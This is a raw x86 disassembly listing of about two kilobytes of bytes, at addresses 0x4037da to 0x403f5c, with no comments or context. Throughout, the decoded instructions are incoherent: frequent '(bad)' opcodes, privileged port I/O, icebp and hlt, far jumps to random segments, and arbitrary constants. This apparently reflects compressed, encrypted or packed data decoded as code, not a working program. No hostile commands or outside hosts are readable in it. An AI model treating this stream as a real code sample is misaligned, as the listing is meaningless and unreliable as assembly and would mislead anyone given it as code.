  4037da:	and    al,BYTE PTR ss:0xb150747f
  4037e1:	pop    ecx
  4037e2:	test   eax,0x1b5f7fa4
  4037e7:	in     eax,0xe
  4037e9:	mov    esp,0x57299787
  4037ee:	inc    edx
  4037ef:	dec    edx
  4037f0:	(bad)  
  4037f1:	and    ebp,ebx
  4037f3:	outs   dx,BYTE PTR ds:[esi]
  4037f4:	mov    cl,0x10
  4037f6:	xchg   edi,eax
  4037f7:	xor    al,0x95
  4037f9:	pop    edi
  4037fa:	in     eax,dx
  4037fb:	in     eax,dx
  4037fc:	pop    eax
  4037fd:	xchg   esp,eax
  4037fe:	scas   eax,DWORD PTR es:[edi]
  4037ff:	lahf   
  403800:	xchg   edi,eax
  403801:	stos   DWORD PTR es:[edi],eax
  403802:	(bad)  
  403803:	(bad)  
  403804:	dec    DWORD PTR [edi-0x1]
  403807:	mov    esp,gs
  403809:	mov    dl,0x21
  40380b:	dec    eax
  40380c:	imul   ebx,DWORD PTR [eax+eax*4+0x3e7b5e3f],0xfa10fa3f
  403817:	mov    al,0x9b
  403819:	icebp  
  40381a:	pop    eax
  40381b:	add    esp,DWORD PTR [edx]
  40381d:	in     eax,0x9f
  40381f:	les    eax,FWORD PTR [esi]
  403821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403822:	clc    
  403823:	dec    edi
  403824:	scas   al,BYTE PTR es:[edi]
  403825:	cmp    bl,0x7
  403828:	sub    cl,al
  40382a:	sbb    ecx,ecx
  40382c:	or     eax,0x683a807b
  403831:	in     eax,0x73
  403833:	jge    0x40385d
  403835:	stos   DWORD PTR es:[edi],eax
  403836:	xor    al,0x92
  403838:	and    al,0xb3
  40383a:	jp     0x4037c9
  40383c:	sub    ecx,eax
  40383e:	test   DWORD PTR [edx-0x5d],0x2c0ca39c
  403845:	std    
  403846:	cli    
  403847:	nop
  403848:	cmp    al,0xd6
  40384a:	xchg   edx,eax
  40384b:	stos   BYTE PTR es:[edi],al
  40384c:	addr16 jl 0x403830
  40384f:	outs   dx,BYTE PTR ds:[esi]
  403850:	sar    DWORD PTR [esi],1
  403852:	pushf  
  403853:	out    dx,eax
  403854:	popa   
  403855:	inc    edx
  403856:	push   esi
  403857:	mov    dh,0xb6
  403859:	pusha  
  40385a:	inc    ebx
  40385b:	inc    esp
  40385c:	in     eax,0x74
  40385e:	jns    0x403816
  403860:	push   0x71
  403862:	cmp    cl,cl
  403864:	and    bh,BYTE PTR [eax-0x487c7160]
  40386a:	push   ebx
  40386b:	or     eax,0xf81b6d57
  403870:	das    
  403871:	dec    edi
  403872:	nop
  403873:	xchg   ebp,eax
  403874:	out    0x5a,al
  403876:	push   eax
  403877:	adc    edi,ebx
  403879:	pop    edi
  40387a:	aam    0x1e
  40387c:	and    al,0xf
  40387e:	mov    esp,0x184fee31
  403883:	addr16 push es
  403885:	sub    edx,DWORD PTR cs:[edx+0x5a]
  403889:	or     al,0xb1
  40388b:	test   DWORD PTR [ebx+0x4f],esp
  40388e:	and    DWORD PTR [esi],edi
  403890:	jmp    0xdd93:0x891c12d
  403897:	jmp    FWORD PTR [eax]
  403899:	jno    0x4038bf
  40389b:	sbb    ch,dh
  40389d:	pop    edx
  40389e:	or     esp,DWORD PTR [ebx-0x1c]
  4038a1:	mov    esp,0x62718870
  4038a6:	cmp    DWORD PTR [ecx-0x35],ebx
  4038a9:	adc    bh,al
  4038ab:	ret    0x73a2
  4038ae:	outs   dx,DWORD PTR ds:[esi]
  4038af:	lock retf 0xdcf9
  4038b3:	cli    
  4038b4:	les    esp,FWORD PTR cs:[edi+ecx*2]
  4038b8:	xor    bh,BYTE PTR [ebp-0x698d99eb]
  4038be:	xrelease xchg BYTE PTR [ecx-0x4f],bl
  4038c2:	repnz mov ebp,0x9142cff7
  4038c8:	pop    esp
  4038c9:	xchg   BYTE PTR [esi-0x23],ch
  4038cc:	pop    eax
  4038cd:	ret    
  4038ce:	lahf   
  4038cf:	push   ebx
  4038d0:	xor    edx,DWORD PTR [ebx-0x34]
  4038d3:	aam    0x42
  4038d5:	cmc    
  4038d6:	aam    0x0
  4038d8:	dec    edx
  4038d9:	mov    ecx,0x4fefa0c
  4038de:	ret    0xc969
  4038e1:	rcr    ebp,0xe
  4038e4:	call   0xdd03:0x81d2e156
  4038eb:	xchg   BYTE PTR [esi+0x19edc070],cl
  4038f1:	xchg   DWORD PTR [ebx+0x5a],edi
  4038f4:	mov    ds:0x477eccd0,al
  4038f9:	dec    ebx
  4038fa:	cmp    al,0x3f
  4038fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038fd:	push   ebp
  4038fe:	push   ss
  4038ff:	dec    ecx
  403900:	retf   0xb225
  403903:	add    ecx,DWORD PTR [ebx+0xc]
  403906:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403907:	into   
  403908:	push   ss
  403909:	xor    BYTE PTR [esi+0x50],cl
  40390c:	pop    es
  40390d:	mov    ss,WORD PTR ds:0xb9d4cc67
  403913:	mov    DWORD PTR [eax+0x4bf698fb],esp
  403919:	out    dx,al
  40391a:	mov    al,0x7c
  40391c:	dec    esi
  40391d:	push   es
  40391e:	mov    edi,0x438bf19c
  403923:	push   ss
  403924:	mov    bh,0x61
  403926:	sar    DWORD PTR [edi+0x3a2024c9],1
  40392c:	push   cs
  40392d:	mov    dh,0x48
  40392f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403930:	xchg   ebp,eax
  403931:	sub    dl,BYTE PTR ds:0x513afdf2
  403937:	jnp    0x4039ac
  403939:	mov    bh,BYTE PTR [ebp+0x7df745a]
  40393f:	cdq    
  403940:	popa   
  403941:	pop    ebx
  403942:	rol    DWORD PTR [ecx+edi*1-0x7f],1
  403946:	mov    ds:0x104703d0,al
  40394b:	lahf   
  40394c:	push   esp
  40394d:	ss jnp 0x4038ff
  403950:	and    di,dx
  403953:	(bad)  
  403955:	out    0xcc,al
  403957:	cli    
  403958:	sub    ah,cl
  40395a:	or     al,0x53
  40395c:	sbb    DWORD PTR [ecx-0x38],ecx
  40395f:	gs jle 0x4039a0
  403962:	jl     0x4039a7
  403964:	sbb    al,0x9
  403966:	dec    ecx
  403967:	mov    ebp,0xfa8b2155
  40396c:	jecxz  0x40399f
  40396e:	retf   0xde18
  403971:	adc    al,0xa2
  403973:	jne    0x4039d6
  403975:	sub    ebp,edi
  403977:	sbb    BYTE PTR [ecx],ch
  403979:	outs   dx,BYTE PTR ds:[esi]
  40397a:	nop
  40397b:	es mov ch,0xac
  40397e:	fidivr WORD PTR [ecx+0x7637ae10]
  403984:	mov    cs,WORD PTR [ecx-0x40]
  403987:	sub    al,0x67
  403989:	mov    ebp,0x2243c39f
  40398e:	stc    
  40398f:	fistp  QWORD PTR [eax-0x36]
  403992:	xchg   ecx,eax
  403993:	push   esi
  403994:	dec    esi
  403995:	fmul   QWORD PTR [ebp-0x2d]
  403998:	cdq    
  403999:	sbb    bl,BYTE PTR [edx+0x53]
  40399c:	cdq    
  40399d:	dec    ebp
  40399e:	lods   eax,DWORD PTR ds:[esi]
  40399f:	and    al,0x5d
  4039a1:	cwde   
  4039a2:	ret    0x77ea
  4039a5:	lds    eax,FWORD PTR [eax+edi*2]
  4039a8:	xchg   DWORD PTR [esi],edx
  4039aa:	dec    ecx
  4039ab:	dec    ebp
  4039ac:	xchg   edi,eax
  4039ad:	mov    bh,0x56
  4039af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039b0:	sub    DWORD PTR [ebp+0x1340a710],0xfffffffe
  4039b7:	xor    BYTE PTR [ebp-0x16],dl
  4039ba:	cmp    al,0xf0
  4039bc:	popf   
  4039bd:	xchg   ebp,eax
  4039be:	leave  
  4039bf:	adc    DWORD PTR [edi-0x3e],ecx
  4039c2:	imul   edi,DWORD PTR [edx],0x6d
  4039c5:	mov    ds:0x607fc90b,eax
  4039ca:	or     ebx,esp
  4039cc:	push   esi
  4039cd:	imul   ecx,DWORD PTR [ecx],0xc5317c4b
  4039d3:	(bad)  
  4039d4:	fidiv  DWORD PTR [edi+edx*2-0x29]
  4039d8:	jne    0x40396e
  4039da:	ret    0x5a2b
  4039dd:	dec    esp
  4039de:	loope  0x4039b8
  4039e0:	adc    bl,BYTE PTR [edx]
  4039e2:	xlat   BYTE PTR ds:[ebx]
  4039e3:	mov    DWORD PTR [ecx-0x75],0xafc29f1e
  4039ea:	call   0xf5e4:0xe72336
  4039f1:	jae    0x403987
  4039f3:	mov    bh,0x7b
  4039f5:	enter  0x6e0c,0x1c
  4039f9:	xchg   edx,eax
  4039fa:	push   ecx
  4039fb:	aas    
  4039fc:	xchg   ebx,eax
  4039fd:	or     edx,DWORD PTR [ebp+0x49]
  403a00:	sbb    DWORD PTR [edx+0x30c6ca7],ebx
  403a06:	sub    DWORD PTR [ebx],0xffffffc7
  403a09:	or     dl,BYTE PTR ds:0x885054a5
  403a0f:	push   0x97111624
  403a14:	(bad)  
  403a16:	pop    es
  403a17:	repz (bad) 
  403a19:	rcr    BYTE PTR [edi+0x25],1
  403a1c:	jmp    0xeeaea0b6
  403a21:	inc    eax
  403a22:	sbb    dl,BYTE PTR [ebx]
  403a24:	lods   eax,DWORD PTR ds:[esi]
  403a25:	jbe    0x4039cb
  403a27:	push   0xc7ef3d2e
  403a2c:	push   edx
  403a2d:	sbb    BYTE PTR [edx+0x46f4fafa],bl
  403a33:	js     0x4039f7
  403a35:	mov    ds:0x4197046e,eax
  403a3a:	rol    bl,cl
  403a3c:	je     0x403a2f
  403a3e:	ret    0xb542
  403a41:	mov    edx,0xcf52cffc
  403a46:	call   0x44b142bb
  403a4b:	cmc    
  403a4c:	sbb    BYTE PTR [ebp-0x1c],bl
  403a4f:	out    0xf3,al
  403a51:	jns    0x403aaf
  403a53:	pushf  
  403a54:	xor    al,0xb9
  403a56:	(bad)  
  403a57:	ror    DWORD PTR [ecx-0x7f28f273],0xa2
  403a5e:	jne    0x403a1f
  403a60:	cmp    BYTE PTR [ecx+0x16de2c3d],dl
  403a66:	enter  0x39cd,0x17
  403a6a:	dec    ecx
  403a6b:	sbb    DWORD PTR [esi-0x25],0xd5d5fd1e
  403a72:	ds jmp 0x403ac2
  403a75:	dec    edi
  403a76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a77:	std    
  403a78:	mov    edx,0x98f4a408
  403a7d:	xor    al,0x7d
  403a7f:	push   es
  403a80:	in     eax,0x1b
  403a82:	inc    ebp
  403a83:	jne    0x403ab3
  403a85:	out    0xa,al
  403a87:	mov    edx,0x1fbcb192
  403a8c:	mov    ebp,0x28456c8f
  403a91:	adc    ch,BYTE PTR [ecx+0x70]
  403a94:	adc    DWORD PTR [edx+0x2a],eax
  403a97:	jg     0x403a42
  403a99:	loope  0x403a20
  403a9b:	xchg   BYTE PTR [esi+0x73],ah
  403a9e:	test   eax,0xe57a73a6
  403aa3:	stc    
  403aa4:	cmp    DWORD PTR [ecx],ebx
  403aa6:	mov    ecx,0xb44283bb
  403aab:	xor    eax,0xf7fefae6
  403ab0:	out    0xc4,al
  403ab2:	sbb    bh,BYTE PTR [edx+0x2fbf6fa2]
  403ab8:	and    al,0x16
  403aba:	pushf  
  403abb:	(bad)  
  403abd:	cmp    eax,DWORD PTR [edx-0x742e5720]
  403ac3:	fisubr WORD PTR [ebp+edx*4-0x3]
  403ac7:	aad    0x71
  403ac9:	adc    eax,0xc01d6611
  403ace:	mov    edi,0xf839578d
  403ad3:	dec    edi
  403ad4:	adc    bh,BYTE PTR [ecx-0x3e69f052]
  403ada:	adc    BYTE PTR [edx+0x43],0xbd
  403ade:	mov    esi,0x8b0ea3c4
  403ae3:	pushf  
  403ae4:	ja     0x403b4c
  403ae6:	lahf   
  403ae7:	add    DWORD PTR [ebx-0x6],edx
  403aea:	cld    
  403aeb:	loopne 0x403ada
  403aed:	bound  ecx,QWORD PTR [ebp-0x3d]
  403af0:	popa   
  403af1:	mov    edi,0xa0f4f5ab
  403af6:	inc    ebp
  403af7:	or     ecx,DWORD PTR [eax-0x60]
  403afa:	jb     0x403abd
  403afc:	mov    WORD PTR [ecx+0x3f3d7e48],cs
  403b02:	push   0xffffff85
  403b04:	inc    esp
  403b05:	add    eax,DWORD PTR [ebp+0x25]
  403b08:	xlat   BYTE PTR ds:[ebx]
  403b09:	loope  0x403aeb
  403b0b:	xlat   BYTE PTR ds:[ebx]
  403b0c:	mov    al,0x8a
  403b0e:	jne    0x403ac7
  403b10:	or     DWORD PTR [edx+0x699147b8],edx
  403b16:	push   esp
  403b17:	mov    ch,0x46
  403b19:	xor    BYTE PTR [eax+0x38543ddc],ch
  403b1f:	dec    edi
  403b20:	pop    edi
  403b21:	or     eax,esp
  403b23:	mov    esp,0x5b16ca48
  403b28:	hlt    
  403b29:	xchg   edi,eax
  403b2a:	xchg   ecx,eax
  403b2b:	maskmovq mm1,(bad)
  403b2c:	test   DWORD PTR [eax],0x675978df
  403b32:	cld    
  403b33:	out    dx,eax
  403b34:	push   eax
  403b35:	aaa    
  403b36:	rol    BYTE PTR [edi+edx*1-0x6cf0f9cb],0x92
  403b3e:	sub    DWORD PTR [ecx],esi
  403b40:	dec    ebp
  403b41:	adc    edi,DWORD PTR [eax+0x5905d7eb]
  403b47:	ds xchg ebx,eax
  403b49:	xor    dl,BYTE PTR [edi]
  403b4b:	(bad)  
  403b4c:	pop    edi
  403b4d:	loope  0x403b77
  403b4f:	(bad)  
  403b50:	fiadd  DWORD PTR [edx+eiz*8]
  403b53:	ficom  WORD PTR [ebp-0x4e]
  403b56:	mov    dh,0x1
  403b58:	or     DWORD PTR [ebx],0x9763a091
  403b5e:	cmp    ebp,DWORD PTR [esi]
  403b60:	or     DWORD PTR [edi-0x7b],esi
  403b63:	test   eax,0x26ae775a
  403b68:	pop    DWORD PTR [ecx]
  403b6a:	stos   DWORD PTR es:[edi],eax
  403b6b:	inc    esp
  403b6c:	fldcw  WORD PTR [ebx+0x29]
  403b6f:	hlt    
  403b70:	mov    dh,0xb4
  403b72:	add    esp,DWORD PTR [edx]
  403b74:	pop    es
  403b75:	jne    0x403b71
  403b77:	xchg   esi,eax
  403b78:	jl     0x403bc2
  403b7a:	xor    eax,0x3c758bbe
  403b7f:	pop    es
  403b80:	test   al,0x14
  403b82:	mov    WORD PTR [esi+0x2ecda0c1],fs
  403b88:	mov    dh,BYTE PTR [esi-0x4c]
  403b8b:	adc    al,BYTE PTR [esi]
  403b8d:	push   ebp
  403b8e:	pop    edx
  403b8f:	jo     0x403bd0
  403b91:	cmp    DWORD PTR [edi],0x62e566c6
  403b97:	stc    
  403b98:	lock daa 
  403b9a:	lahf   
  403b9b:	mov    edx,0xb9c576cd
  403ba0:	add    al,0xe1
  403ba2:	fucomip st,st(3)
  403ba4:	leave  
  403ba5:	sub    DWORD PTR [esi],ecx
  403ba7:	aas    
  403ba8:	mov    ebp,0x69f431cc
  403bad:	(bad)  
  403bae:	mov    eax,0xbd4e079b
  403bb3:	and    eax,0x728c9cfd
  403bb8:	push   0xe6d260f
  403bbd:	inc    edx
  403bbe:	or     BYTE PTR [ebx],dh
  403bc0:	cmc    
  403bc1:	test   ah,al
  403bc3:	stos   DWORD PTR es:[edi],eax
  403bc4:	mov    ebx,0x214a199c
  403bc9:	inc    ebp
  403bca:	mov    edi,DWORD PTR [ebx+0x29]
  403bcd:	mov    bh,0xa2
  403bcf:	cmp    eax,DWORD PTR [esp+eiz*4]
  403bd2:	int    0xcb
  403bd4:	inc    ecx
  403bd5:	mov    esi,0xb49ceff2
  403bda:	je     0x403b7f
  403bdc:	js     0x403bcd
  403bde:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bdf:	aad    0x2
  403be1:	ja     0x403c1a
  403be3:	mov    bl,0xde
  403be5:	cld    
  403be6:	shr    BYTE PTR [edi+edx*2],1
  403be9:	in     eax,dx
  403bea:	jge    0x403c46
  403bec:	inc    edx
  403bed:	call   0xbc147f06
  403bf2:	sbb    DWORD PTR [edi-0x45],esp
  403bf5:	pusha  
  403bf6:	outs   dx,DWORD PTR ds:[esi]
  403bf7:	aad    0x50
  403bf9:	(bad)  
  403bfa:	clc    
  403bfb:	sbb    ebp,DWORD PTR [ebp+0x12]
  403bfe:	sti    
  403bff:	push   eax
  403c00:	in     al,0x25
  403c02:	hlt    
  403c03:	cmp    al,al
  403c05:	add    DWORD PTR [edi+0x26c10ff0],esp
  403c0b:	add    eax,0x79b54562
  403c10:	stos   BYTE PTR es:[edi],al
  403c11:	ss mov ch,0x99
  403c14:	js     0x403c49
  403c16:	inc    esp
  403c17:	add    BYTE PTR [esi+0x704b027a],dl
  403c1d:	inc    ebx
  403c1e:	ror    ebp,0xe0
  403c21:	pop    esi
  403c22:	inc    edi
  403c23:	iret   
  403c24:	(bad)  [ebx]
  403c26:	pop    ebp
  403c27:	mov    edx,0xa74dbfea
  403c2c:	repnz push edi
  403c2e:	les    eax,FWORD PTR [edx]
  403c30:	mov    esp,0x9399e470
  403c35:	mov    ch,0x35
  403c37:	lea    esi,ds:0xbfb057cf
  403c3d:	hlt    
  403c3e:	lods   eax,DWORD PTR ds:[esi]
  403c3f:	ins    BYTE PTR es:[edi],dx
  403c40:	push   es
  403c41:	pusha  
  403c42:	jo     0x403c7c
  403c44:	pushf  
  403c45:	test   dh,ah
  403c47:	jbe    0x403be8
  403c49:	push   0x14
  403c4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c4c:	push   ebp
  403c4d:	dec    eax
  403c4e:	int3   
  403c4f:	push   edx
  403c50:	mov    ebp,0xd9e2ef2f
  403c55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c56:	retf   0x680
  403c59:	ret    0x5f89
  403c5c:	test   BYTE PTR [eax],bh
  403c5e:	cdq    
  403c5f:	mov    eax,0x988907fa
  403c64:	fwait
  403c65:	jns    0x403c0d
  403c67:	shl    BYTE PTR [edx],cl
  403c69:	or     al,ah
  403c6b:	in     eax,0xf4
  403c6d:	lds    esp,FWORD PTR [edx+eiz*4-0x6]
  403c71:	xchg   ebx,eax
  403c72:	mov    eax,ds:0x8f52b9be
  403c77:	mov    dh,0x60
  403c79:	lds    ebp,FWORD PTR es:[ebp-0x630c47eb]
  403c80:	push   ds
  403c81:	inc    ecx
  403c82:	xor    eax,0x3c22f9c5
  403c87:	fwait
  403c88:	mov    esi,esp
  403c8a:	daa    
  403c8b:	test   al,0x7
  403c8d:	retf   0x8486
  403c90:	nop
  403c91:	gs jb  0x403c1a
  403c94:	fst    QWORD PTR [ecx]
  403c96:	(bad)  
  403c97:	xlat   BYTE PTR ds:[ebx]
  403c98:	sub    al,BYTE PTR [eax+0x1d]
  403c9b:	(bad)  
  403c9c:	scas   eax,DWORD PTR es:[edi]
  403c9d:	adc    al,0xb0
  403c9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403ca0:	hlt    
  403ca1:	mov    cl,0x6d
  403ca3:	fstp   DWORD PTR [esi-0x78e6c16a]
  403ca9:	fbstp  TBYTE PTR [edx+esi*8+0x79]
  403cad:	lock and esi,DWORD PTR [esp+ebp*1]
  403cb1:	lahf   
  403cb2:	adc    dl,bh
  403cb4:	fbld   TBYTE PTR [ecx]
  403cb6:	and    eax,0x3df48838
  403cbb:	ja     0x403d2b
  403cbd:	dec    esp
  403cbe:	fistp  QWORD PTR [edi+0xa9a84fd]
  403cc4:	test   BYTE PTR [ebx-0x5cd54c51],cl
  403cca:	or     eax,0x66f7cf8f
  403ccf:	jecxz  0x403d25
  403cd1:	pop    ds
  403cd2:	lods   eax,DWORD PTR ds:[esi]
  403cd3:	push   es
  403cd4:	jp     0x403d42
  403cd6:	jo     0x403d1a
  403cd8:	sbb    edx,DWORD PTR [edi+0x1c64d1b2]
  403cde:	jp     0x403d3c
  403ce0:	dec    esp
  403ce1:	sub    eax,0xcccfc23c
  403ce6:	or     ah,al
  403ce8:	cmp    al,0xb3
  403cea:	fcmovbe st,st(0)
  403cec:	into   
  403ced:	xor    DWORD PTR [edx+0x9dfef21],esp
  403cf3:	mov    esi,0x127fee8c
  403cf8:	icebp  
  403cf9:	(bad)  
  403cfa:	and    al,cl
  403cfc:	adc    dl,al
  403cfe:	mov    ebx,0xcc9c17c4
  403d03:	adc    ebx,DWORD PTR [esi-0x72cfb9f3]
  403d09:	mov    eax,ds:0x76fa620c
  403d0e:	cwde   
  403d0f:	ret    0x215e
  403d12:	sar    ecx,cl
  403d14:	aad    0xc5
  403d16:	add    al,0x76
  403d18:	nop    DWORD PTR [edi+0x15]
  403d1c:	dec    eax
  403d1d:	sti    
  403d1e:	popa   
  403d1f:	push   edi
  403d20:	cmp    BYTE PTR [eax+0x6],bl
  403d23:	leave  
  403d24:	jo     0x403d23
  403d26:	dec    edx
  403d27:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d28:	test   BYTE PTR [edi+ecx*2+0x37],ah
  403d2c:	mov    edi,0x2b3ae88c
  403d31:	pusha  
  403d32:	xchg   esi,eax
  403d33:	mov    edi,0xbc7c0202
  403d38:	adc    ebp,ebp
  403d3a:	aaa    
  403d3b:	mov    ebp,0xe5f879f
  403d40:	repnz inc ebx
  403d42:	mov    ebp,0x1a5bdce4
  403d47:	pop    ebx
  403d48:	add    esp,DWORD PTR [esp+edi*1]
  403d4b:	sbb    esi,esp
  403d4d:	push   ss
  403d4e:	clc    
  403d4f:	(bad)  
  403d50:	dec    eax
  403d51:	xor    BYTE PTR ds:0x76ab42ce,ch
  403d57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403d58:	cmp    al,0xbf
  403d5a:	inc    ecx
  403d5b:	lds    ecx,FWORD PTR [ebp+0x2b22cbcb]
  403d61:	or     bh,0xe9
  403d64:	xchg   esp,eax
  403d65:	adc    esp,DWORD PTR [esi+edx*1-0x67]
  403d69:	or     al,cl
  403d6b:	push   cs
  403d6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d6d:	jmp    0xe61a:0x83ec60d2
  403d74:	dec    edi
  403d75:	xchg   esp,eax
  403d76:	push   0x6481de2b
  403d7b:	sbb    DWORD PTR [ebp+0x644d7ce9],edi
  403d81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d82:	sbb    al,BYTE PTR [esi-0x32]
  403d85:	sbb    esi,DWORD PTR ds:0xb07b065d
  403d8b:	pop    ds
  403d8c:	or     DWORD PTR [edx+esi*8],ecx
  403d8f:	adc    edi,DWORD PTR [eax]
  403d91:	push   0x48025298
  403d96:	cs test al,0x2d
  403d99:	pop    ss
  403d9a:	xor    BYTE PTR [eax+0x2f7dbc67],ch
  403da0:	cli    
  403da1:	pusha  
  403da2:	(bad)  
  403da3:	aad    0xc2
  403da5:	push   eax
  403da6:	sub    dh,bh
  403da8:	mov    dl,0x52
  403daa:	and    eax,0x5fec17e4
  403daf:	inc    esp
  403db0:	xchg   edi,eax
  403db1:	ror    BYTE PTR [ebp+0x78],0x81
  403db5:	das    
  403db6:	push   0xd6400c88
  403dbb:	and    bh,BYTE PTR [esi]
  403dbd:	cli    
  403dbe:	fidiv  DWORD PTR [edx]
  403dc0:	xchg   edi,eax
  403dc1:	das    
  403dc2:	test   al,0x30
  403dc4:	fdivr  DWORD PTR ds:0xa1411800
  403dca:	mov    dh,0x8a
  403dcc:	les    ebx,FWORD PTR [edi-0x73]
  403dcf:	shl    dl,1
  403dd1:	sbb    DWORD PTR [edx-0x635f6290],edx
  403dd7:	push   esp
  403dd8:	dec    eax
  403dd9:	or     DWORD PTR [ecx+0x663bb5ec],0x7e40159
  403de3:	js     0x403dae
  403de5:	xchg   ebp,eax
  403de6:	adc    esp,DWORD PTR [edx+0x1dceaa45]
  403dec:	ins    BYTE PTR es:[edi],dx
  403ded:	retf   
  403dee:	orps   xmm6,XMMWORD PTR [edi]
  403df1:	jmp    0x33ba:0x27752a24
  403df8:	fcomip st,st(0)
  403dfa:	stos   DWORD PTR es:[edi],eax
  403dfb:	xchg   ebp,eax
  403dfc:	lods   al,BYTE PTR ds:[esi]
  403dfd:	jmp    0xcfd9:0xabf32233
  403e04:	retf   
  403e05:	adc    esi,DWORD PTR [edi]
  403e07:	retf   0x7b90
  403e0a:	mov    ch,0xfe
  403e0c:	scas   eax,DWORD PTR es:[edi]
  403e0d:	fs out dx,al
  403e0f:	lds    ebx,FWORD PTR [ebx+eiz*8+0xf]
  403e13:	pop    esp
  403e14:	out    dx,al
  403e15:	in     al,dx
  403e16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e17:	stos   DWORD PTR es:[edi],eax
  403e18:	pusha  
  403e19:	sbb    ch,BYTE PTR [esi-0x6ca02514]
  403e1f:	icebp  
  403e20:	popa   
  403e21:	into   
  403e22:	in     al,0x3e
  403e24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e25:	icebp  
  403e26:	push   0x28975047
  403e2b:	cmp    al,0x3c
  403e2d:	dec    edi
  403e2e:	mov    al,ds:0x5d28b63b
  403e33:	iret   
  403e34:	shl    BYTE PTR [ecx],cl
  403e36:	stos   BYTE PTR es:[edi],al
  403e37:	scas   al,BYTE PTR es:[edi]
  403e38:	push   edi
  403e39:	test   bl,bh
  403e3b:	jl     0x403de9
  403e3d:	leave  
  403e3e:	je     0x403e1b
  403e40:	clc    
  403e41:	mov    esi,ss
  403e43:	mov    al,0x8a
  403e45:	pop    esp
  403e46:	mov    eax,0xec7a6d7d
  403e4b:	das    
  403e4c:	push   ds
  403e4d:	jle    0x403de8
  403e4f:	or     DWORD PTR [eax],edx
  403e51:	outs   dx,BYTE PTR ds:[esi]
  403e52:	mov    eax,ds:0x949c7a6a
  403e57:	inc    eax
  403e58:	stos   DWORD PTR es:[edi],eax
  403e59:	aad    0x5b
  403e5b:	jmp    0x403e1a
  403e5d:	(bad)  
  403e5e:	icebp  
  403e5f:	mov    ebx,0xcdb35d89
  403e64:	mov    cl,0x1b
  403e66:	lods   al,BYTE PTR ds:[esi]
  403e67:	jmp    0x403e2a
  403e69:	ja     0x403ee1
  403e6b:	cmp    eax,0x2e16c256
  403e71:	dec    ecx
  403e72:	loopne 0x403e7d
  403e74:	add    eax,0x40619b74
  403e79:	mov    dl,BYTE PTR [edi-0x2c]
  403e7c:	dec    eax
  403e7d:	xchg   edi,eax
  403e7e:	(bad)  
  403e7f:	retf   
  403e80:	mov    cl,0x3d
  403e82:	ins    BYTE PTR es:[edi],dx
  403e83:	and    DWORD PTR [ecx],esp
  403e85:	sub    DWORD PTR [esi-0x1189eb6],eax
  403e8b:	and    BYTE PTR [ebx+esi*1],0xd
  403e8f:	pop    eax
  403e90:	les    esi,FWORD PTR [ebp+0x16]
  403e93:	or     edx,ecx
  403e95:	xchg   BYTE PTR [ecx-0x1a565dab],al
  403e9b:	(bad)  
  403e9c:	xchg   edx,eax
  403e9d:	xchg   ecx,eax
  403e9e:	jmp    0x80803a4c
  403ea3:	js     0x403e44
  403ea5:	ins    DWORD PTR es:[edi],dx
  403ea6:	loope  0x403e43
  403ea8:	addr16 adc al,0x2c
  403eab:	imul   ecx,DWORD PTR [ebp-0x7d275916],0xd
  403eb2:	push   0xbe8f52e8
  403eb7:	sub    al,ch
  403eb9:	(bad)  
  403eba:	mov    al,ds:0xfff2fc10
  403ebf:	jno    0x403e6b
  403ec1:	push   ecx
  403ec2:	cmc    
  403ec3:	dec    ebp
  403ec4:	js     0x403f43
  403ec6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ec7:	ss std 
  403ec9:	call   0xc724:0x9adb8922
  403ed0:	xor    al,0x24
  403ed2:	scas   al,BYTE PTR es:[edi]
  403ed3:	sbb    al,0xe6
  403ed5:	cmc    
  403ed6:	or     al,0x60
  403ed8:	dec    edi
  403ed9:	(bad)  
  403eda:	pop    ds
  403edb:	mov    BYTE PTR [ebx-0x1d65e8ce],0xce
  403ee2:	cmp    BYTE PTR [esi+eiz*8],bl
  403ee5:	jle    0x403eb2
  403ee7:	and    eax,0xfdb4783c
  403eec:	mov    ds:0xb26d8206,al
  403ef1:	jo     0x403ed9
  403ef3:	les    ebp,FWORD PTR [edi+0x56]
  403ef6:	stc    
  403ef7:	add    BYTE PTR ds:0x23d3c2dd,al
  403efd:	or     eax,0x1381ad97
  403f02:	sbb    dh,BYTE PTR [ecx-0x3c]
  403f05:	push   es
  403f06:	dec    eax
  403f07:	xchg   edx,eax
  403f08:	inc    esi
  403f09:	cs inc ecx
  403f0b:	and    dh,dl
  403f0d:	das    
  403f0e:	mov    eax,ds:0x9d42f414
  403f13:	mov    ebx,0x9c028c1f
  403f18:	pushf  
  403f19:	arpl   dx,bx
  403f1b:	stc    
  403f1c:	push   ecx
  403f1d:	pop    ds
  403f1e:	add    DWORD PTR [ecx+0x66],ecx
  403f21:	bound  edx,QWORD PTR [edx+eiz*1-0x64]
  403f25:	les    ebx,FWORD PTR [ebp+eax*1-0x57c7eb43]
  403f2c:	sub    BYTE PTR [edx-0x632a7a25],dh
  403f32:	xor    eax,0xd797d910
  403f37:	outs   dx,DWORD PTR ds:[esi]
  403f38:	push   0xfffffff2
  403f3a:	xchg   DWORD PTR [ecx-0x533254a7],edi
  403f40:	mov    bl,BYTE PTR [esi]
  403f42:	popf   
  403f43:	arpl   WORD PTR [edx-0x747ed7ae],bx
  403f49:	shr    DWORD PTR [edx+esi*2-0x5f],cl
  403f4d:	sbb    al,BYTE PTR [edi]
  403f4f:	(bad)  
  403f50:	dec    edi
  403f51:	dec    esi
  403f52:	lods   eax,DWORD PTR ds:[esi]
  403f53:	rcr    ebp,0xa0
  403f56:	sbb    BYTE PTR [ebx+0x7e3f89a],cl
  403f5c:	inc    ebx
